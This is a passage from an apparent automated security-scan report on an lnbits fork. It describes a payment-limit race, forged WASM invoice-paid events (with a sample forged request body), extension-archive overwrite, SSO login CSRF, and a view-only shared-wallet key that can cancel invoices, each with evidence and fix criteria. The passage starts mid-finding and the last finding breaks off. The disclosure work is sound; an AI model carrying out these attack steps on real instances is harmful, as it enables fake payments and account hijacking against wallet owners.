   The project's own tests (test_check_wallet_limits_and_time_limit, test_check_wallet_daily_limit_counts_all_daily_payments) assert that the daily and spacing limits are enforced, establishing that the control is one the project defends rather than an advisory setting.

## Impact
Integrity of the operator's spending-policy enforcement is defeated: funds leave the wallet beyond the configured daily cap or minimum spacing, limited only by the wallet balance. No confidentiality or availability effect.

## Reproduction steps
1. Attacker holds the admin key of a wallet on an instance where the operator has configured a daily-withdraw or inter-transaction limit (the control under attack). They fire several POST /api/v1/payments requests in parallel, each individually under the limit; all pass the phase-1 check before any debit is recorded, and all are paid. No timing precision is needed beyond overlapping requests, because the FIFO lock scheduling orders the phases favourably; AT:P reflects the race-condition nature and the need for the limit to be in use.

## Recommended fix
Policy checks that depend on ledger state (check_wallet_limits) are evaluated in a connection block that is released before the critical section that inserts the ledger row, so concurrent requests all observe the pre-state. Fix criteria: Evaluate (or re-evaluate) check_wallet_limits for the source wallet inside the per-wallet lock, in the same connection that inserts the outgoing record, so that the N-th concurrent request sees the N-1 earlier debits. Verify by issuing concurrent payments that together exceed lnbits_wallet_limit_daily_max_withdraw (or violate lnbits_wallet_limit_secs_between_trans) and confirming only those within the limit succeed.

---
**Severity:** LOW
**Status:** Open
**Category:** Race condition
**CWE:** [CWE-367](https://cwe.mitre.org/data/definitions/367.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257389

---

# Forged WASM invoice-paid events: caller-chosen `extension`/`source_id` selects target and owner context

## Details
The WASM runtime delivers `invoice_paid` events to an extension chosen by fields the invoice creator controls, and derives the event's *owner context* (the private storage partition the handler runs in) from a row id the invoice creator also controls.

`dispatch_wasm_invoice_paid` (lnbits/core/wasm_ext/wasm/events.py) runs for every settled incoming payment. `_payment_extension_id` returns `payment.extension`, else `payment.extra['tag']`. `_wasm_invoice_paid_owner_id` then takes `payment.extra['source_id']` verbatim, looks it up by `id` (table-wide, no owner filter) in every table listed in the extension's granted `wallet.create_invoice_public` policies, and returns that row's `__lnbits_owner_id__`. The export is invoked with `context="event"`, `owner_id=<row owner>` and a payload (amount, memo, extra, walletId, full payment JSON) the invoice creator chose.

Nothing ties the paid wallet to the resolved owner. The legitimate producer, `wallet_create_invoice_public` (api/host.py:409-453), selects the wallet through the policy's `wallet_field` of the source row and emits `extra={'tag': ext, 'source_id': ..., 'extra_<ext>': ...}, extension=ext`; the dispatcher never checks `payment.wallet_id == row[wallet_field]`, nor that the wallet owner enabled the extension, nor that the host created the invoice. By contrast the wallet-watch branch of the same function requires the wallet owner's enabled per-wallet grant.

Both selectors are attacker-controlled: `CreateInvoice` (models/payments.py:289-306) exposes `extension` and `extra` on `POST /api/v1/payments`, which needs only an invoice key of *any* wallet; `crud.create_payment` stores `extension=data.extension` and `tag=extra['tag']`. Any self-registered user therefore (1) learns a victim's source row id (public by nature — tip-jar/pay-link URLs; the docs themselves assume public visitors know source ids), (2) creates an invoice on their own wallet with `{"out": false, "amount": 1, "extension": "<wasm_ext>", "extra": {"source_id": "<victim_row>", "extra_<wasm_ext>": {...}}}`, (3) pays it from a second own wallet. `_pay_internal_invoice` enqueues it on `internal_invoice_queue`, `TaskManager._invoice_dispatcher` fans it to the `core_wasm` listener, and the extension's `onInvoicePaid` export runs as the victim's storage owner (`_require_owner_id()`-scoped storage.get/set/delete/get_paginated, plus any other event-context host method such as background payments under the victim's own grant) with a payload indistinguishable from a genuine `createInvoicePublic` settlement — a fake-payment confirmation across the user↔user boundary, with no sats leaving the attacker.

Mitigating factor: docs/wasm-extensions.md ('Payments, events, and notifications') tells extension authors to verify 'payment hash, amount, wallet, source, and the extension's stored invoice binding' for settlement-driven state changes; an extension that matches the event's paymentHash against a binding it stored at invoice creation is not fooled. That guidance is on third-party extension code, not a control the host ships: the host still attaches the victim's owner context and records the invocation under the victim's id for every forged event, and the `wallet_field` binding the policy defines — and the host enforces at creation — is simply not re-checked at settlement. This holds only where a WASM extension holding `wallet.create_invoice_public` with an `onInvoicePaid` event export is installed and active.

## Evidence
1. [lnbits/core/wasm\_ext/wasm/events.py:165–190](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/wasm/events.py#L165-L190)
   _payment_extension_id returns payment.extension, else extra['tag'] / payment.tag; _wasm_invoice_paid_owner_id takes extra['source_id'] verbatim and resolves the row's __lnbits_owner_id__ via storage_get_row_owner_id over every wallet.create_invoice_public source table. The source row's wallet_field is never compared with payment.wallet_id and nothing checks the host created the invoice — this is the code the fix must change.
2. [lnbits/core/wasm\_ext/wasm/events.py:18–48](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/wasm/events.py#L18-L48)
   dispatch_wasm_invoice_paid runs for every settled incoming payment; the extension-tag branch (20-27) attaches the resolved owner with no user-grant or wallet check, while the sibling wallet-watch branch (29-45) requires the wallet owner's enabled per-wallet grant — the asymmetry shows the intended gating the tag path lacks.
3. [lnbits/core/wasm\_ext/wasm/events.py:51–83](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/wasm/events.py#L51-L83)
   The event export is invoked with context='event', owner_id=<victim owner hash>, event_type='invoice_paid' and a payload (amount, memo, extra, walletId, full payment JSON) wholly chosen by the invoice creator.
4. [lnbits/core/wasm\_ext/api/host.py:409–452](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/api/host.py#L409-L452)
   wallet_create_invoice_public is the legitimate producer: it binds the wallet through the policy's wallet_field of the source row and emits extra={'tag': ext, 'source_id': ..., 'extra_<ext>': ...}, extension=ext — exactly the shape any invoice-key holder can reproduce on the public API, so the forged event is indistinguishable to the extension.
5. [lnbits/core/wasm\_ext/api/host.py:75–93](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/wasm_ext/api/host.py#L75-L93)
   ExtensionHostAPI sets self.owner_id = owner_id when no user is present; has_authenticated_context() is true for context 'event' and _require_owner_id() (1045-1048) scopes storage_get/storage_set/storage_get_paginated/delete to the victim's private partition during the forged event.
6. [lnbits/core/models/payments.py:289–305](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/payments.py#L289-L305)
   CreateInvoice, the body model of POST /api/v1/payments, exposes `extra: dict` and `extension: str` to the API caller with no restriction or reserved-key filtering.
7. [lnbits/core/views/payment\_api.py:280–329](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L280-L329)
   api_payments_create accepts any wallet's invoice key (require_base_invoice_key) and passes invoice_data, including extension and extra, straight to create_payment_request.
8. [lnbits/core/crud/payments.py:261–277](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L261-L277)
   create_payment persists tag=extra.get('tag') and extension=data.extension, so the stored Payment that reaches the invoice listeners carries the caller-chosen extension id and source_id.
9. [lnbits/core/services/payments.py:860–869](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L860-L869)
   Internal payments (attacker paying their own invoice from a second own wallet) are enqueued on internal_invoice_queue; TaskManager._invoice_dispatcher fans every queued payment to all registered invoice listeners, so the forged invoice is settled at zero cost.
10. [lnbits/app.py:614–617](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L614-L617)
   dispatch_wasm_invoice_paid is registered as the 'core_wasm' invoice listener for all incoming payments.

## Impact
Integrity: the extension's per-user records for the victim are modified by an event the host presents as that user's legitimate paid invoice (orders marked paid, claims unlocked, counters credited) without funds reaching the victim; the modification is confined to one extension's rows for one user and its exact shape is set by the extension's handler, and extensions that follow the documented payment-hash binding check are unaffected — LOW. Confidentiality: nothing is returned to the attacker; only indirect effects such as paywalled content unlocked on a public page — LOW. Availability: none.

## Reproduction steps
1. Attacker: any self-registered user (registration open by default) or anyone holding an invoice key for any wallet. Delivery: POST /api/v1/payments with attacker-chosen `extension` and `extra.source_id`, then an internal self-payment from a second own wallet (admin key), which settles for free and deterministically fires every invoice listener. No victim interaction. AT:PRESENT because a WASM extension holding wallet.create_invoice_public with an onInvoicePaid event export must be installed and active and the victim must own a source row — a deployment condition the repository does not settle.

## Recommended fix
1. dispatch_wasm_invoice_paid selects the target extension from payment.extension / extra.tag, values any invoice-key holder can set on POST /api/v1/payments, so arbitrary payments are presented to an extension as its own. Fix criteria: An invoice-paid event reaches a WASM extension via the extension-tag path only for payments the host itself created on that extension's behalf (e.g. a host-set, caller-unforgeable marker, or `extension` stripped/overwritten on the public create-invoice API), or for wallets whose owner granted wallet.payments.watch. A payment created through /api/v1/payments with a forged `extension`/`tag` must not invoke the extension's onInvoicePaid export.
2. _wasm_invoice_paid_owner_id resolves the owner context from extra.source_id alone, never checking that payment.wallet_id matches the source row's configured wallet_field, so an attacker's wallet payment runs the handler as a different user's storage owner. Fix criteria: Owner context is attached to an invoice-paid event only when the paid wallet equals the wallet referenced by the source row (the policy's wallet_field) — the same binding wallet_create_invoice_public enforces at creation. A payment to wallet W whose source row points at wallet V≠W yields no owner context (or is dropped), verified by a test that pays a self-owned invoice carrying another user's source_id and asserts the export is not run as that user.

---
**Severity:** LOW
**Status:** Open
**Category:** Improper Authorization
**CWE:** [CWE-345](https://cwe.mitre.org/data/definitions/345.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257387

---

# Extension builder /zip lets non-admin builder users delete and replace installed extensions' trusted archives (data/zips/<id>.zip), breaking their restore after container recreate

## Details
`POST /api/v1/extension/builder/zip` (`api_build_extension`, lnbits/core/views/extensions_builder_api.py:54-75) is guarded only by `check_extension_builder`, which admits every authenticated account once the admin-editable setting `lnbits_extensions_builder_activate_non_admins` is on (the feature's advertised non-admin mode, UI label 'Enable Extensions Builder for non admin users'; default off). The handler builds `InstallableExtension(id=data.id)` and writes the generated archive to `zip_path` = `<LNBITS_DATA_FOLDER>/zips/<data.id>.zip`, first `os.remove()`-ing whatever is there. `data.id` is only required to be snake_case (`validate_id`, models/extensions_builder.py:437-443), so a non-admin can name it after any installed extension (`lnurlp`, `tpos`, ...). That path is the single shared namespace the installer and the startup restore treat as the trusted copy of the installed extension (models/extensions.py:538-543); no ownership or installed-id check is made.

Confirmed consequences:
1. Persistent loss of the installed extension's archive. On startup `check_installed_extension_files` (app.py:398-415) only re-downloads when `zip_path` is missing; because the attacker's file is present it is used instead. Its layout is flat (`zip_directory(build_dir, ...)` at :69, unlike `/deploy`'s `build_dir.parent` at :107), so `_archive_config_name` (models/extensions.py:1222-1228, requires `<dir>/config.json`) yields `{}` and `extract_archive` (models/extensions.py:675-712, expects one wrapper dir via `os.listdir(tmp_dir)[0]` then `<that>/config.json`) raises; `check_installed_extensions` (app.py:280-300) catches and logs it and the extension is NOT restored. In the documented default Docker layout (docs/guide/installation.md:314-318: `data/` is a persisted volume, extensions installed inside the container are lost on recreate), every clobbered extension therefore stays unmounted after each image upgrade/recreate until an admin reinstalls it. Installed ids are visible to any user via `GET /api/v1/extension` (extension_api.py:874).
2. Admin installs/upgrades can be made to fail: `install_extension` (services/extensions.py:213-234) downloads to `zip_path` then re-opens it for config/validate/extract; a builder user looping `/zip` with that id swaps the file in the window (GitHub releases carry no hash), and extraction fails.
3. Builder users sharing a `data.id` receive each other's archives (`FileResponse(ext_zip_file)`), since the namespace is global.

Not confirmed (the candidate's headline claim): code execution. Because the `/zip` archive has no wrapper directory, neither the startup restore nor `install_extension` ever reaches `copytree` into `ext_dir` or `importlib.import_module`; the attacker's Python is never loaded. The admin position gains nothing here (admins already install/uninstall extensions); the finding is the non-admin builder user's ability to destroy/replace admin-managed server state under the data folder.

Holds only where the operator has enabled the Extensions Builder for non-admin users.

## Evidence
1. [lnbits/core/views/extensions\_builder\_api.py:54–74](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/extensions_builder_api.py#L54-L74)
   api_build_extension (POST /api/v1/extension/builder/zip), guarded only by check_extension_builder, builds InstallableExtension(id=data.id), os.remove()s whatever is at ext_info.zip_path and writes the caller's archive there (zip_directory(build_dir, ...) — flat layout, contrast :107 build_dir.parent for /deploy). data.id is caller-chosen; no check against installed extension ids or ownership.
2. [lnbits/core/models/extensions.py:538–542](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L538-L542)
   zip_path is the single shared namespace <LNBITS_DATA_FOLDER>/zips/<id>.zip used for admin-installed extension archives and for builder output alike; no per-user or per-purpose separation.
3. [lnbits/app.py:398–414](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/app.py#L398-L414)
   check_installed_extension_files re-downloads only when zip_path is missing; with the attacker's file present it calls load_archive_config and extract_archive on it. The flat archive makes extract_archive raise; the caller check_installed_extensions (:280-300) catches/logs it and the extension is not restored — persistently, on every startup, until an admin reinstalls.
4. [lnbits/core/models/extensions.py:675–711](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L675-L711)
   extract_archive takes os.listdir(tmp_dir)[0] as the single wrapper directory and opens <that>/config.json before copying into ext_dir. The builder /zip archive has no wrapper directory, so this raises (NotADirectoryError or FileNotFoundError) before any copy into ext_dir or import — which is why the overwrite yields loss of the extension rather than code execution.
5. [lnbits/core/models/extensions.py:1222–1227](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions.py#L1222-L1227)
   _archive_config_name only recognises <dir>/config.json (exactly two path parts); the flat builder archive's top-level config.json is not found, so load_archive_config returns {} for the swapped file.
6. [lnbits/decorators.py:624–631](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/decorators.py#L624-L631)
   check_extension_builder admits any authenticated account (check_user_exists) when lnbits_extensions_builder_activate_non_admins is true; otherwise admins only. Extension install/uninstall (extension_api.py:101, :682) remain check_admin — the builder /zip path writes the same trusted archive without that gate.
7. [lnbits/core/models/extensions\_builder.py:437–442](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/extensions_builder.py#L437-L442)
   validate_id only enforces snake_case, which every installed extension id (lnurlp, tpos, withdraw, ...) satisfies.
8. [lnbits/core/services/extensions.py:213–233](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/extensions.py#L213-L233)
   install_extension downloads to zip_path, then separately re-opens it for load_archive_config/validate_archive/extract_archive; a concurrent builder /zip call for the same id replaces the file in that window (TOCTOU; GitHub releases carry no hash), making the admin's install/upgrade fail.
9. [docs/guide/installation.md:314–317](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/docs/guide/installation.md#L314-L317)
   Deployment fact that makes consequence 1 routine: the official Docker instructions mount only data/ as a volume and state that extensions installed inside the container are lost when it is recreated, so the startup restore from data/zips/<id>.zip runs for every installed extension on each recreate/upgrade.

## Impact
Integrity LOW: a low-privileged user overwrites/deletes admin-managed server files under the data folder, but only files of the form zips/<snake_case>.zip and with content that is never loaded as code (flat archive is rejected by extract_archive), so no code injection and no reach into secrets or funds (C:N). Availability LOW: every clobbered installed extension fails to restore at each startup after a recreate and stays unmounted until an admin reinstalls it, and admin installs can be made to fail; the core wallet keeps running and recovery is a reinstall, so a sustained but partial, recoverable outage.

## Reproduction steps
1. Attacker: any self-registered account on an instance where the admin has enabled the Extensions Builder for non-admin users (lnbits_extensions_builder_activate_non_admins; default off — the feature's advertised non-admin mode, so AT:P together with the restore trigger). One POST /api/v1/extension/builder/zip per installed extension id (ids readable via GET /api/v1/extension) deletes and replaces data/zips/<id>.zip; no race or special timing is needed for the persistent effect, which materialises at the operator's next container recreate/upgrade (documented default Docker layout) or whenever an installed extension's directory is otherwise missing at startup. The install-time TOCTOU variant needs a loop against an admin install. No user interaction in the CVSS sense.

## Recommended fix
1. Builder output shares the `zips/<id>.zip` namespace that the installer and the startup restore treat as the trusted installed-extension archive, and the builder lets any caller pick that id. Fix criteria: Builder-produced archives are written to a location never read by install/restore code (e.g. the per-user builder working directory with a random name) and served from there; a builder request cannot delete or replace `zips/<id>.zip` for any id, and non-admin builder requests are refused for ids of installed extensions. Verify: after a /zip call with data.id of an installed extension, the installed archive is byte-identical and a restart re-extracts the original.
2. Startup restore and install extract whatever is at `zip_path` without verifying it is the archive originally downloaded (no hash for GitHub releases, re-open between download and extract). Fix criteria: A content hash recorded at install time is verified before any extraction (startup restore and install), extraction reads from the same open handle or a private temp copy, and a failed/missing archive falls back to re-download rather than leaving the extension unmounted. Verify: a modified zips/<id>.zip is rejected and the extension is still restored at startup.

---
**Severity:** LOW
**Status:** Open
**Category:** IDOR/BOLA
**CWE:** [CWE-73](https://cwe.mitre.org/data/definitions/73.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** LOW
**User interaction:** NONE
**Vulnerable system confidentiality impact:** NONE
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** LOW
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257386

---

# SSO callback accepts unbound state: login CSRF logs victim into attacker's account

## Details
Holds on deployments where the operator has enabled an SSO method (google/github/keycloak/oidc in `auth_allowed_methods`; default is username-password only, enabling is documented in docs/guide/oidc-authentication.md and is any admin's setting).

The OAuth callback `GET /api/v1/auth/{provider}/token` (`handle_oauth_token`, lnbits/core/views/auth_api.py:426-445) completes a login for whoever delivers a valid authorization `code`, without verifying that the browser presenting the callback is the one that started the flow. `login_with_sso_provider` (:404-423) uses `state` only to carry `encrypt_internal_message(user_id)` for the email-link feature; for a plain login `user_id` is None, `encrypt_internal_message(None)` returns None (lnbits/helpers.py:210-211) and no `state` parameter is sent to the IdP at all. `handle_oauth_token` then explicitly accepts `provider_sso.state is None or == 'null'` as a normal login. `_new_sso` (:750-779) builds a fresh provider object per request with positional `(client_id, client_secret, None, allow_insecure_http=...)`; the only session touch is `request.session.pop('user', None)`, and nothing in the tree ever sets `request.session['user']`, so SessionMiddleware contributes no binding. LNbits' own `OidcSSO`/`KeycloakSSO` (lnbits/core/models/sso/*.py) override only userinfo mapping and discovery.

Dependency assumption (fastapi-sso 0.19.0, pinned `fastapi-sso~=0.19.0`): `verify_and_process` only stores `request.query_params.get('state')` into `sso.state` and performs no comparison; the library's `use_state` constructor flag is deprecated and performs no verification, and its PKCE cookie binding applies only to providers that set `uses_pkce=True`, which none of google/github/keycloak/oidc do. State verification is therefore the application's job, and this code does none.

Login CSRF attack:
1. Attacker starts `/api/v1/auth/<provider>` in their own browser, authenticates to the IdP with their own IdP account, and captures the IdP's redirect back to `https://lnbits.example/api/v1/auth/<provider>/token?code=C` without letting it complete.
2. Attacker causes the victim's browser to load that URL (link, image, redirect) within the code's lifetime (minutes at common IdPs).
3. LNbits exchanges `C` using `redirect_url` derived from the callback URL itself (matching what was registered), obtains the attacker's IdP identity, and `_handle_sso_login` (:661-700) finds/creates the account for that email and, via `_login_response`/`_auth_success_response` (:703-734), sets `cookie_access_token` and `is_lnbits_user_authorized` for the attacker's account in the victim's browser (SameSite=Lax governs sending, not setting), redirecting to `/wallet`.
4. The victim is silently operating an attacker-controlled account: invoices they create and funds they deposit land in a wallet the attacker controls, anything they enter into that account is visible to the attacker, and the victim's own session cookie is displaced.

The repository's own test (tests/api/test_auth_api.py::test_auth_api_sso_login_and_callback, lines 136-141) completes the callback with `state=''` and no prior redirect in the same client, matching the vulnerable behaviour.

## Evidence
1. [lnbits/core/views/auth\_api.py:426–445](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L426-L445)
   handle_oauth_token builds a fresh SSO object, calls verify_and_process(request) and treats state None or the literal 'null' as a plain login; nothing ties the callback to the browser that initiated the flow (no session nonce compared, request.session is only popped).
2. [lnbits/core/views/auth\_api.py:404–423](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L404-L423)
   login_with_sso_provider sends state = encrypt_internal_message(user_id), which is None for ordinary logins, so the IdP round-trip carries no anti-CSRF value for the common case.
3. [lnbits/core/views/auth\_api.py:750–779](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L750-L779)
   _new_sso constructs the fastapi_sso provider without enabling any state binding (positional client_id, client_secret, redirect_uri=None, allow_insecure_http), so the dependency's optional state protection is off.
4. [lnbits/core/views/auth\_api.py:661–700](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/auth_api.py#L661-L700)
   _handle_sso_login issues the full session (cookie_access_token, is_lnbits_user_authorized) for whichever account the IdP identity maps to and redirects to /wallet, overwriting the victim's existing session cookies.

## Impact
Victim is logged into an attacker-controlled account: deposits and invoices go to the attacker and the attacker sees the victim's actions in that account; the victim's own session is displaced. No direct access to the victim's real account data.

## Reproduction steps
1. Unauthenticated network attacker with an account at the configured IdP. Requires the operator to have enabled an SSO provider (non-default, AT:P) and the victim to load a URL (passive). Delivery must happen within the IdP code lifetime, which is routine. Assumes fastapi-sso 0.19.0 performs no browser-bound state check unless enabled.

## Recommended fix
The OAuth callback is not bound to the initiating browser: no unpredictable, session-bound state value is generated on redirect and verified on callback, and absent/'null' state is accepted. Fix criteria: Every SSO redirect must carry an unpredictable state bound to the browser (session cookie or signed cookie), the callback must reject missing, 'null' or non-matching state, and the email-link user_id must ride alongside that nonce rather than replace it. Verify: a callback with a valid code but no/foreign state is rejected and sets no session cookies.

---
**Severity:** LOW
**Status:** Open
**Category:** Cross-site request forgery
**CWE:** [CWE-352](https://cwe.mitre.org/data/definitions/352.html)
**Attack vector:** NETWORK
**Attack complexity:** LOW
**Attack requirements:** PRESENT
**Privileges required:** NONE
**User interaction:** PASSIVE
**Vulnerable system confidentiality impact:** LOW
**Vulnerable system integrity impact:** LOW
**Vulnerable system availability impact:** NONE
**Subsequent system confidentiality impact:** NONE
**Subsequent system integrity impact:** NONE
**Subsequent system availability impact:** NONE
**Repository:** Halbarevi/lnbits
**Branch:** main
**Commit:** c35839fc18d3db276ae9fc4a882e45acf93c27c2
**Date created:** 2026-10-18
**Finding URL:** https://claude.ai/security?project=scanproj_01BTwWnZcYLbCYri2cBYLV4c&finding=scan_018UQGDd6JX3LQih66KHw1wN-5257381

---

# View-only shared-wallet key can cancel owner's invoices and rewrite owner's payment metadata

## Details
Wallet sharing lets an owner invite another user with an explicit subset of permissions (`view-payments`, `receive-payments`, `send-payments`; services/wallets.py invite_to_wallet / update_wallet_share_permissions). The invitee gets a mirror wallet of type `lightning-shared` with its own admin and invoice keys. `get_wallet_for_key` (crud/wallets.py:295-317) and `get_wallet` (:181-189) resolve such a key through `get_source_wallet` → `Wallet.mirror_shared_wallet` (models/wallets.py:155-174), which copies the approved share's permission list into `share_permissions`; `source_wallet_id` (:197-202) then maps the mirror onto the owner's wallet id as soon as any permission is granted.

`get_standalone_payment(..., wallet_id=key.wallet.id)` (crud/payments.py:51-56) is the only authorisation several write/control handlers perform: it loads the mirror, requires nothing beyond `wallet.can_view_payments`, and rewrites the wallet filter to the owner's `source_wallet_id`. Having obtained the owner's row, the handlers act on it with no permission check:

- `POST /api/v1/payments/cancel` (payment_api.py:514-526, `require_admin_key` of the mirror) → `cancel_hold_invoice` (services/payments.py:1281-1296): calls `funding_source.cancel_hold_invoice(payment_hash)` and, on success, marks the owner's incoming record FAILED via `update_payment`. Nothing checks `extra.hold_invoice` or who is acting. Only the LND backends implement cancel (wallets/lndgrpc.py:373, wallets/lndrest.py:399; base.py:198 raises), so on an LND-funded instance a VIEW-only share-holder can cancel the owner's open hold invoices (refunding the payer and destroying the in-flight receivable); assuming LND's invoicesrpc `CancelInvoice` accepts any open invoice (not only hold invoices), every pending invoice the owner has issued can be cancelled at the node.
- `PATCH /api/v1/payments/extra` (:366-395): appends arbitrary new keys to the owner's `payment.extra` on successful payments (duplicates refused); extensions key behaviour off `extra` (tag, link ids, comments).
- `PUT /api/v1/payments/{hash}/labels` (:331-363, `require_base_admin_key`): the LightKeyChecker returns the mirror's BaseWallet, but `get_standalone_payment` re-fetches it with `get_wallet`, so the same resolution applies and the owner's payment labels are overwritten.

The design separates VIEW from RECEIVE/SEND: `create_invoice` requires `can_receive_payments` (services/payments.py:319), `pay_invoice` requires `can_send_payments` (:1409), and tests/unit/test_services_shared_wallet.py:543-600 assert a VIEW-only share can neither create invoices nor pay. The recorded threat model names the limited-access shared-wallet holder as an adversary; cancelling the owner's invoices or editing their ledger rows with only `view-payments` crosses that boundary. (`POST /settle` uses the same lookup but needs the preimage, so VIEW alone cannot abuse it.)

## Evidence
1. [lnbits/core/views/payment\_api.py:514–526](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L514-L526)
   api_payments_cancel authenticates only the caller's own admin key (of the mirror wallet), looks the payment up with wallet_id=key_type.wallet.id and passes the owner's row straight to cancel_hold_invoice; no receive/owner permission check.
2. [lnbits/core/crud/payments.py:51–56](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/payments.py#L51-L56)
   get_standalone_payment with a wallet_id requires only wallet.can_view_payments and then filters on wallet.source_wallet_id, so a mirror whose share grants VIEW_PAYMENTS alone resolves the owner's payments for every caller, including write handlers.
3. [lnbits/core/services/payments.py:1281–1296](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L1281-L1296)
   cancel_hold_invoice asks the funding source to cancel by payment_hash and marks the owner's record FAILED; it checks neither the acting wallet nor extra.hold_invoice.
4. [lnbits/core/views/payment\_api.py:366–395](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L366-L395)
   api_update_payment_extra uses the same view-gated lookup and writes new keys into the owner's payment.extra.
5. [lnbits/core/views/payment\_api.py:331–363](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/views/payment_api.py#L331-L363)
   api_update_payment_labels uses the same lookup (re-fetching the mirror via get_wallet) and overwrites the owner's payment labels.
6. [lnbits/core/models/wallets.py:182–202](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/models/wallets.py#L182-L202)
   has_permission for lightning-shared wallets is the share's permission list; source_wallet_id maps the mirror to the owner's wallet whenever any permission is granted, so VIEW alone reaches the owner's ledger rows.
7. [lnbits/core/crud/wallets.py:295–317](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/crud/wallets.py#L295-L317)
   get_wallet_for_key resolves the mirror's admin key through get_source_wallet/mirror_shared_wallet, so require_admin_key yields the mirror wallet carrying the share's permissions.
8. [lnbits/core/services/payments.py:319–323](https://github.com/Halbarevi/lnbits/blob/c35839fc18d3db276ae9fc4a882e45acf93c27c2/lnbits/core/services/payments.py#L319-L323)
   create_invoice refuses wallets without RECEIVE_PAYMENTS — the sanctioned boundary that the cancel/extra/labels handlers do not enforce.

## Impact
Integrity: the owner's apipayments rows (status FAILED, extra, labels) are modified by a party granted read-only access, and extension logic keyed on extra can be steered. Availability: the owner's open/hold invoices can be cancelled at the node, denying them incoming payments on that wallet. No confidentiality impact beyond what VIEW already grants; no funds are moved.

## Reproduction steps
